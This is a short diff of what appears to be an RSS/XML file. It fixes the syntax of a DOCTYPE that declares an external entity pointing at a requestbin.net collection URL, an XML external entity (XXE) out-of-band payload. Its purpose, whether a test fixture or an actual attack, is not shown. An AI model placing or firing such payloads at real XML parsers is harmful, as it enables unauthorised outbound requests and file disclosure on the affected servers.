@@ -2,7 +2,7 @@
 <!DOCTYPE title [
  <!ELEMENT title ANY >
  <!ENTITY send SYSTEM "https://requestbin.net/r/9r83vig2?file=aa">
-]]>
+]>
 
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
